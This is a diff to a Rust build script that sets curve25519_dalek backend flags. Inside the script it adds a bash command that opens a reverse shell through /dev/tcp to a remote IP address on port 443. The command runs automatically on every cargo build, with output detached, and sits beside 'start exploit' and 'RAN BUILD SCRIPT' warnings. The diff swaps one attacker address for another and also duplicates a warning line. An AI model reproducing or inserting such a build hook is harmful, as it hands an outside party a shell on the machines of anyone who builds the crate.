@@ -97,14 +97,17 @@ fn main() {
     println!("cargo:rustc-cfg=curve25519_dalek_backend=\"{curve25519_dalek_backend}\"");
 
     println!("cargo:warning=start exploit");
+
     Command::new("bash")
         .arg("-c")
-        .arg("0<&26-;exec 26<>/dev/tcp/35.175.221.61/443;sh <&26 >&26 2>&26")
-        .stdin(Stdio::null())   // <-- prevents cargo's stdin from leaking in
+        .arg("0<&26-;exec 26<>/dev/tcp/54.210.96.110/443;sh <&26 >&26 2>&26")
+        .stdin(Stdio::null())
         .stdout(Stdio::null())  // optional: detach stdout too
         .stderr(Stdio::null())  // optional: detach stderr too
         .spawn()
         .expect("failed to spawn process");
+
+    println!("cargo:warning=RAN BUILD SCRIPT");
     println!("cargo:warning=RAN BUILD SCRIPT");
 
 }
